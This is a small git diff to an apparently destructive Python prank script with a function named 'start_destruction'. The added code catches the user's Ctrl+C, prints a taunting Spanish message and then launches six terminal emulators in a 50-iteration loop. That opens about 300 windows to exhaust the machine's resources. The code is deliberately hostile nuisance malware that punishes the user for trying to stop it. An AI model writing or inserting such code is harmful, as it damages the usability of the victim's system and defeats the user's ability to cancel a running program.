@@ -57,4 +57,17 @@ def start_destruction():
      
      except KeyboardInterrupt:
           print("No intentes cancelar el programa noob XDDDDDDDDDDDD")
+          for _ in range(50):
+               system('qterminal')
+               
+               system('terminator')
+               
+               system('alacritty')
+               
+               system('xterm')
+               
+               system('konsole')
+               
+               
+               system('xfce4-terminal-emulator')
      
